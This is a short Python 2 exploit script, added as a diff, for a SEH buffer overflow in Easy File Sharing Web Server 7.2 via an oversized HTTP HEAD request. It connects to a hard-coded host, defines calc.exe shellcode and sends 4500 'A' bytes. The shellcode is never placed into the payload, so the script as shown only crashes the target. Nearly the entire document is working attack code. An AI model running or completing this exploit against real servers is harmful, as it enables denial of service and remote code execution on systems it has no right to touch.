@@ -1,0 +1,35 @@
+# Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow
+# Date: 12/2/2015
+# Exploit Author: ArminCyber
+# Contact: Armin.Exploit@gmail.com
+# Version: 7.2
+# Tested on: XP SP3 EN
+# category: Remote Exploit
+
+import socket
+import sys
+
+host = "10.0.0.20"
+port = 80
+s = socket.socket()
+print "Connecting to: " + host + ":" + str(port)
+s.connect((host,port))
+
+# Run Calc.exe
+shellcode = ("\xdd\xc1\xb8\x7d\x5f\x6b\x07\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x13\x31\x45\x1a\x83\xed\xfc\x03\x45\x16\xe2\x88\xdc\x8f\xfb"
+"\x43\x31\x1d\x6c\xc0\xd4\xce\x0f\x52\x4e\x5d\x81\x3e\xfb\x13"
+"\x11\x35\x8d\xdf\xda\x3f\x7e\x4d\x57\x8f\xf5\xf3\x70\x64\x56"
+"\x30\x0a\x26\x52\x30\x87\xa2\xbb\xe0\x96\xb4\x4f\xb4\x87\x6c"
+"\x5f\x82\x94\x7b\x1d\xae\x49\x02\x9d\x29\xc5\x6d\xb0\x70\x9c"
+"\x9d\xc7\x0f\x41\x41\xd9\x11\x7e\x45\x77\x12\x56")
+
+offset = "A" * 4500
+
+payload = offset 
+print len(payload)
+
+# HEAD
+s.send("HEAD " + payload + " HTTP/1.0\r\n\r\n")
+s.close()
+print "Done..."
